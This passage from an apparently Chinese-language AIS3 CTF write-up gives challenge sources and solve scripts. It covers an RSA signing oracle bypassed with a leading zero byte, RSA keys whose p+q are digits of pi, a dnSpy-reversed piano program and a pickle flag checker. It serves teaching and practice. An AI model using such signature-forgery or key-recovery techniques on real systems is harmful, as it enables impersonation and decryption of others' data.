function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>        n<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token macro property">#n = [29, 42, 83, 6, 27, 10, 33, 64, 79, 68, 58, 40, 73, 7, 30, 36, 29, 42, 83, 6, 3, 73, 13, 36, 57, 70, 30, 53, 89, 7, 89, 85, 89, 70, 89, 85, 28, 9, 39, 85]</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token macro property">#n = [6, 83, 42, 29, 64, 33, 10, 27, 40, 58, 68, 79, 36, 30, 7, 73, 6, 83, 42, 29, 36, 13, 73, 3, 53, 30, 70, 57, 85, 89, 7, 89, 85, 89, 70, 89, 85, 39, 9, 28]</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>執行 script 後得到<code>AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}22</code> 可以看到 padding 為 22</p><blockquote><p>flag <code>AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}</code></p></blockquote><h3 id="ReSident-evil-villAge-136"><a href="#ReSident-evil-villAge-136" class="headerlink" title="ReSident evil villAge(136)"></a>ReSident evil villAge(136)</h3><blockquote><p>註：此題用了非正規解</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        題目 Source code如下    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socketserver<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">recv</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>msg <span class="token operator">+</span> b<span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        privkey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> privkey<span class="token punctuation">.</span>n        e <span class="token operator">=</span> privkey<span class="token punctuation">.</span>e        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Welcome to ReSident evil villAge, sign the name "Ethan Winters" to get the flag.'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'n = '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'e = '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'1) sign\n2) verify\n3) exit\n'</span><span class="token punctuation">)</span>            option <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> option <span class="token operator">==</span> b<span class="token string">'1'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'Name (in hex): '</span><span class="token punctuation">)</span>                msg <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> msg <span class="token operator">==</span> b<span class="token string">'Ethan Winters'</span> <span class="token operator">or</span> bytes_to_long<span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">>=</span> n<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># msg+k*n not allowed</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Nice try!'</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    sig <span class="token operator">=</span> pow<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span> privkey<span class="token punctuation">.</span>d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># TODO: Apply hashing first to prevent forgery</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Signature: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> option <span class="token operator">==</span> b<span class="token string">'2'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'Signature: '</span><span class="token punctuation">)</span>                sig <span class="token operator">=</span> int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                verified <span class="token operator">=</span> <span class="token punctuation">(</span>pow<span class="token punctuation">(</span>sig<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">==</span> bytes_to_long<span class="token punctuation">(</span>b<span class="token string">'Ethan Winters'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> verified<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'AIS3{THIS_IS_A_FAKE_FLAG}'</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'Well done!'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">break</span><span class="token keyword">class</span> <span class="token class-name">ForkingServer</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>ForkingTCPServer<span class="token punctuation">,</span> socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    HOST<span class="token punctuation">,</span> PORT <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">42069</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>    server <span class="token operator">=</span> ForkingServer<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> Task<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>    </div></div><p>題目是 RSA 簽證<br>目標是把 signature 送進去以達到 <code>pow(sig, e, n) == bytes_to_long(b'Ethan Winters')</code><br>原則上只要把 Ethan Winters 轉成 hex 丟進去讓它跑出 signature 之後，再丟回去讓他 verify 就可以了。<br>但是從 <code>if msg == b'Ethan Winters' or bytes_to_long(msg) &gt;= n:  # msg+k*n not allowed</code> 這行可以看到 <code>check msg == Ethan Winters</code> 會被擋掉。<br>由於送進去的是字串，於是要讓<strong>數字不變但是字串改變</strong>，就去嘗試 Bypass，發現前面加上 <code>00</code> 可以繞過，所以傳 <code>00</code> 加上 <code>Ethan Winters</code> 轉成 <code>hex</code> 就可以了<br>直接上圖。<br><img src="https://i.imgur.com/Kwxy3WU.png"><br><img src="https://i.imgur.com/4dpX7qf.png"></p><h3 id="Republic-of-South-Africa-235"><a href="#Republic-of-South-Africa-235" class="headerlink" title="Republic of South Africa (235)"></a>Republic of South Africa (235)</h3><blockquote><p>RSA collision or something IDK I am a physicist<br>[name=Author: Kuruwa]</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        題目 Source code如下    </div>    <div class="spoiler-content">        <p>chall.py</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">import</span> random<span class="token keyword">import</span> gmpy2gmpy2<span class="token punctuation">.</span>get_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>precision <span class="token operator">=</span> <span class="token number">1024</span><span class="token keyword">def</span> <span class="token function">collision</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> m2<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> v1<span class="token operator">*</span><span class="token punctuation">(</span>m1<span class="token operator">-</span>m2<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>m1<span class="token operator">+</span>m2<span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>m2<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>m1<span class="token operator">+</span>m2<span class="token punctuation">)</span><span class="token punctuation">,</span> v1<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>m1<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>m1<span class="token operator">+</span>m2<span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token operator">*</span><span class="token punctuation">(</span>m2<span class="token operator">-</span>m1<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>m1<span class="token operator">+</span>m2<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">keygen</span><span class="token punctuation">(</span>digits<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># Warning: slow implementation</span>    m1 <span class="token operator">=</span> <span class="token number">1</span>    m2 <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>digits<span class="token number">-2</span><span class="token punctuation">)</span>    v1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>mpfr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    v2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>mpfr<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    count <span class="token operator">=</span> <span class="token number">0</span>       <span class="token comment" spellcheck="true"># p+q</span>    <span class="token keyword">while</span> abs<span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">></span> v2 <span class="token operator">or</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            v1 <span class="token operator">=</span> <span class="token operator">-</span>v1        <span class="token keyword">else</span><span class="token punctuation">:</span>            v1<span class="token punctuation">,</span> v2 <span class="token operator">=</span> collision<span class="token punctuation">(</span>m1<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> m2<span class="token punctuation">,</span> v2<span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>count<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">,</span> count<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>        q <span class="token operator">=</span> count <span class="token operator">-</span> p        <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">and</span> isPrime<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> qp<span class="token punctuation">,</span> q <span class="token operator">=</span> keygen<span class="token punctuation">(</span><span class="token number">153</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> <span class="token number">65537</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n ='</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'e ='</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c ='</span><span class="token punctuation">,</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>    </div></div><p>從題目名稱很明顯可以知道是 RSA</p><pre class=" language-bash"><code class="language-bash">count <span class="token operator">=</span> p+qn <span class="token operator">=</span> p*q</code></pre><p>由於這兩個式子，可以很輕易地推出 <code>phi </code><br><code>phi = (p-1)*(q-1) = p*q - (p+q) +1 = n - count +1</code><br>既然我們已經有 <code>n</code> 了，那目標是要求出 <code>count</code><br>但 <code>count</code> 會是非常大的數字，根本沒辦法爆搜<br>(TMI:當時因為 collision() 是物理中完全彈性碰撞的公式，所以花很多時間在研究那邊QQ)<br>於是把函式丟進去 ipython 裡面看看有什麼<br>發現 count 長得很像 $\pi$ ，而且位數會等於丟給 <code>keygen()</code> 的值<br><code>digits</code> 就代表位數<br>於是便上網查了 153 位數的 $\pi$<br>接著按照一般 RSA 流程就可以得到flag了</p><p><img src="https://i.imgur.com/2uZKwqU.jpg" alt="keygen"></p><p><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">23662270311503602529211462628663973377651035055221337186547659666520360329842954292759496973737109678655075242892199643594552737098393308599593056828393773327639809644570618472781338585802514939812387999523164606025662379300143159103239039862833152034195535186138249963826772564309026532268561022599227047</span>e <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> <span class="token number">11458615427536252698065643586706850515055080432343893818398610010478579108516179388166781637371605857508073447120074461777733767824330662610330121174203247272860627922171793234818603728793293847713278049996058754527159158251083995933600335482394024095666411743953262490304176144151437205651312338816540536</span>count<span class="token operator">=</span><span class="token number">314159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848</span>phi <span class="token operator">=</span> n<span class="token operator">-</span>count<span class="token operator">+</span><span class="token number">1</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><blockquote><p>flag <code>AIS3{https://www.youtube.com/watch?v=jsYwFizhncE}</code><br>順帶一提 flag 內的 <a href="https://www.youtube.com/watch?v=jsYwFizhncE">youtube 網址</a>是利用物理的彈性碰撞去計算<code>pi</code>，還滿有趣的，感興趣的可以去看看影片~~</p></blockquote><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Piano-158"><a href="#Piano-158" class="headerlink" title="Piano(158)"></a>Piano(158)</h3><blockquote><p>Is this a MUSIC GAME?<br>[name=Author: CSY54]</p></blockquote><p>題目給了一個 <code>.exe 檔</code>，執行後會是鋼琴界面(真的有聲音)<br><img src="https://i.imgur.com/9EgZvRS.png" alt="Piano"><br>題目還給一個 <code>.dll 檔</code>，可以用 <code>dnSpy</code> 來 <strong>反編譯</strong> ，就可以看到它在做的事情</p><blockquote><p>註 記得<a href="https://www.youtube.com/watch?v=6BzBLzLnVk4&amp;t=6885s">SCIST Reverse III</a>是在講各種技巧，所以就在比賽第一天晚上去看了這個影片，到1:29:15 的時候開始講 C#、Net，其中有講到 dnSpy 這個工具的用法，推薦大家去看~~~</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        isValid()    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">// piano.Piano</span><span class="token comment" spellcheck="true">// Token: 0x06000003 RID: 3 RVA: 0x00002220 File Offset: 0x00000420</span><span class="token keyword">private</span> <span class="token keyword">bool</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>    <span class="token punctuation">{</span>        <span class="token number">14</span><span class="token punctuation">,</span>        <span class="token number">17</span><span class="token punctuation">,</span>        <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">19</span><span class="token punctuation">,</span>        <span class="token number">18</span><span class="token punctuation">,</span>        <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token number">6</span><span class="token punctuation">,</span>        <span class="token number">11</span><span class="token punctuation">,</span>        <span class="token number">16</span><span class="token punctuation">,</span>        <span class="token number">15</span><span class="token punctuation">,</span>        <span class="token number">14</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> list2 <span class="token operator">=</span> <span class="token keyword">new</span> List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>    <span class="token punctuation">{</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">6</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">0</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">!=</span> list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">!=</span> list2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><p>我們可以拿到 <code>list</code> 和 <code>list2</code><br>然後他會去 check <code> this.notes[]</code><br>可以看到想求出 <code>this.notes[i]</code> 的話只要把 <code>(list[i] + list2[i]) / 2</code> 就可以了<br>會得到答案的 index <code>{7,7,10,10,11,11,10,9,9,3,3,8,8,7}</code><br>把得到的 index 值去對應到 <code>dll檔</code> 內每一個按鍵對應的值，按鋼琴鍵就會跳出 flag 了 (是升調的小星星哦<span class="github-emoji"><span>😂</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>)<br><img src="https://i.imgur.com/glKJkAU.png" alt="twinkle"></p><blockquote><p>flag <code>AIS3{7wink1e_tw1nkl3_l1ttl3_574r_1n_C_5h4rp}</code></p></blockquote><h3 id="rabbit-Peekora-cucumber"><a href="#rabbit-Peekora-cucumber" class="headerlink" title=":rabbit: Peekora :cucumber:"></a><span class="github-emoji"><span>🐰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f430.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Peekora <span class="github-emoji"><span>🥒</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f952.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></h3><blockquote><p>吃太甜要配什麼<br>可樂<br>因為 too 甜配 cola<br>Author:spiltline</p></blockquote><p>題目給了<code>.pkl檔</code>和它的用法 <code>python3 -m pickle flag_checker.pkl</code></p><div class="spoiler collapsed">    <div class="spoiler-title">        flag_checker.pkl    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp">c__builtin__<span class="token function">input</span><span class="token punctuation">(</span>S<span class="token string">'FLAG: '</span>tRp00c__builtin__getattrp1<span class="token function">0g1</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c__builtin__exitc__builtin__strlS<span class="token string">'__getitem__'</span>tRp2<span class="token function">0g2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'startswith'</span><span class="token function">tR</span><span class="token punctuation">(</span>S<span class="token string">'AIS3{'</span><span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'endswith'</span><span class="token function">tR</span><span class="token punctuation">(</span>S<span class="token string">'}'</span><span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I6tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>VA<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I9tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vj<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I9tRp3<span class="token function">0g2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I11tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vp<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I14tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>g3<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I1tRp4<span class="token function">0g2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I5tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vd<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I10tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vz<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token 